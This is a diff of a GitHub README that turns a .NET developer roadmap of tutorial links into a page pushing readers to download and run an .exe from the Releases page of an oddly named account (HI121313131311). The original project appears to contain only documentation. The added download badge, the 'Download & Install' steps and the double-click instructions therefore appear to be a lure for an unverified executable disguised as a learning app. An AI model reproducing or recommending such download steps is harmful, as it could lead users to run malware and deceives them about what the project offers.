@@ -1,46 +1,69 @@
-# dotnet-developer-roadmap
+# 🚀 junior-dotnet-developer-roadmap - Guide to .NET Development with Ease
 
-## 🗄️ Console App + Database (ADO.NET / Dapper / EF Core)
+[![Download Now](https://img.shields.io/badge/Download%20Now-Visit%20Page-brightgreen)](https://github.com/HI121313131311/junior-dotnet-developer-roadmap/releases)
+
+## 🗄️ Overview
+
+The junior-dotnet-developer-roadmap helps you start your journey in .NET development. This repository includes a console application that connects to SQL Server using ADO.NET, Dapper, and EF Core. You will also find helpful resources that explain key concepts to enhance your learning.
+
+## 🚀 Getting Started
+
+To start using the application, you need to download it from the Releases page. This page contains all the versions of the application for you to choose from.
+
+## 📁 System Requirements
+
+- **Operating System:** Windows 10 or later
+- **.NET Version:** .NET 8 Runtime
+- **Memory:** At least 2 GB RAM 
+- **Disk Space:** At least 100 MB of free space
+
+## 💻 Features
+
+- Connect to SQL Server using secure protocols.
+- Use Dapper for simple data access.
+- Leverage Entity Framework Core for advanced data management.
+- Access a variety of documentation links for deeper learning.
+
+## 📥 Download & Install
+
+Visit this page to download the latest version of the application:  
+[Download Here](https://github.com/HI121313131311/junior-dotnet-developer-roadmap/releases)
+
+### Steps to Download:
+
+1. Click on the **Download Here** link.
+2. You will see the latest release at the top of the page.
+3. Look for the `.exe` file listed under "Assets."
+4. Click on the file name to begin the download.
+
+### Steps to Run the Application:
+
+1. After the download completes, locate the `.exe` file in your downloads folder.
+2. Double-click the file to run it. 
+3. Follow the on-screen instructions to connect to your SQL Server database.
+
+## 📖 Documentation
+
+To understand how to use the application and explore its features, here are some useful links:
 
 - [Using .NET 8 Console App to Connect to SQL Server with Microsoft.Data.SqlClient](https://github.com/sannlynnhtun-coding/dotnet-developer-roadmap/blob/main/Using%20a%20.NET%208%20Console%20Application%20to%20Connect%20to%20SQL%20Server%20with%20Microsoft.Data.SqlClient.md)
 - [Using .NET 8 Console App with Dapper](https://github.com/sannlynnhtun-coding/dotnet-developer-roadmap/blob/main/Using%20a%20.NET%208%20Console%20Application%20to%20Connect%20to%20SQL%20Server%20with%20Dapper.md)
 - [Using .NET 8 Console App with EF Core](https://github.com/sannlynnhtun-coding/dotnet-developer-roadmap/blob/main/Using%20a%20.NET%208%20Console%20Application%20to%20Connect%20to%20SQL%20Server%20with%20EFCore.md)
 - [Benefits of a Separate EF Core Database Library](https://github.com/sannlynnhtun-coding/dotnet-developer-roadmap/blob/main/Benefits%20of%20a%20Separate%20EF%20Core%20Database%20Library.md)
 
-## 🖥️ Fundamentals
+## 📚 Additional Resources
 
-- [Class Library](https://github.com/sannlynnhtun-coding/dotnet-developer-roadmap/blob/main/Class%20Library.md)
-- [Understanding Async/Await in C# Console Applications](https://github.com/sannlynnhtun-coding/dotnet-developer-roadmap/blob/main/Understanding%20Async%20Await%20in%20C%23%20Console%20Applications.md)
-- [Implementing N-Layered Architecture in C# Console Applications](https://github.com/sannlynnhtun-coding/dotnet-developer-roadmap/blob/main/Implementing%20N-Layered%20Architecture%20in%20C%23%20Console%20Applications.md)
+Here are some useful materials to deepen your understanding of .NET and database connections:
 
-## 🌐 ASP.NET Core Web API
+- [Class Library Overview](https://dotnet.microsoft.com/learn/dotnet/what-is-dotnet)
+- [Getting Started with ADO.NET](https://dotnet.microsoft.com/learn/data/ado-net)
+- [Introduction to Dapper](https://dapper-tutorial.net/)
+- [Understanding Entity Framework Core](https://docs.microsoft.com/en-us/ef/core/)
 
-- [Using ADO.NET in ASP.NET Core Web API](https://github.com/sannlynnhtun-coding/dotnet-developer-roadmap/blob/main/Using%20ADO.NET%20in%20ASP.NET%20Core%20Web%20API.md)
-- [Using Dapper in ASP.NET Core Web API](https://github.com/sannlynnhtun-coding/dotnet-developer-roadmap/blob/main/Using%20Dapper%20in%20ASP.NET%20Core%20Web%20API.md)
-- [Using EF Core (DB First) in ASP.NET Core Web API](https://github.com/sannlynnhtun-coding/dotnet-developer-roadmap/blob/main/Using%20EFCore%20in%20ASP.NET%20Core%20Web%20API.md)
+## ⚙️ Support
 
-## 🏛️ ASP.NET Core MVC (Submit / AJAX)
+If you encounter issues while downloading or running the application, feel free to check the Issues section in the repository. You can also submit your questions or concerns there. 
 
-- [CRUD with EF Core Database First (Submit)](https://github.com/sannlynnhtun-coding/dotnet-developer-roadmap/blob/main/CRUD%20with%20EF%20Core%20Database%20First%20(Submit).md)
-- [CRUD with EF Core Database First (jQuery AJAX)](https://github.com/sannlynnhtun-coding/dotnet-developer-roadmap/blob/main/CRUD%20with%20EF%20Core%20Database%20First%20(jQuery%20AJAX).md)
-- [Data Passing Techniques in ASP.NET Core MVC](https://github.com/sannlynnhtun-coding/dotnet-developer-roadmap/blob/main/Data%20Passing%20Techniques%20in%20ASP.NET%20Core%20MVC.md)
-- [Integrating AdminLTE v3](https://github.com/sannlynnhtun-coding/dotnet-developer-roadmap/blob/main/Integrating%20AdminLTE%20v3.md)
+Remember, help is available, and you are not alone in your development journey. 
 
-## 📊 Charts & Visualization
-
-- [ApexCharts & HighCharts in ASP.NET Core MVC](https://github.com/sannlynnhtun-coding/dotnet-developer-roadmap/blob/main/ApexCharts%20&%20HighCharts%20in%20ASP.NET%20Core%20MVC.md)
-
-## 📡 SignalR & Real-time Features
-
-- [Build a Real-Time Chat App (SignalR, .NET 8 MVC)](https://github.com/sannlynnhtun-coding/dotnet-developer-roadmap/blob/main/Build%20a%20Real-Time%20Chat%20App%20(SignalR%2C%20.NET%208%20MVC.md)
-- [Realtime Notification System](https://github.com/sannlynnhtun-coding/dotnet-developer-roadmap/blob/main/Realtime%20Notification%20System.md)
-
-## 🛠️ Middleware & Logging
-
-- [ASP.NET Core Middleware](https://github.com/sannlynnhtun-coding/dotnet-developer-roadmap/blob/main/ASP.NET%20Core%20Middleware.md)
-- [Introduction to Logging](https://github.com/sannlynnhtun-coding/dotnet-developer-roadmap/blob/main/Introduction%20to%20Logging.md)
-- [ASP.NET Core Logging with Serilog](https://github.com/sannlynnhtun-coding/dotnet-developer-roadmap/blob/main/ASP.NET%20Core%20Logging%20with%20Serilog.md)
-
-## 🔐 Authentication
-
-- [ASP.NET Core Cookie Authentication](https://github.com/sannlynnhtun-coding/dotnet-developer-roadmap/blob/main/ASP.NET%20Core%20Cookie%20Authentication.md)
+Thank you for choosing the junior-dotnet-developer-roadmap as your guide to mastering .NET development.
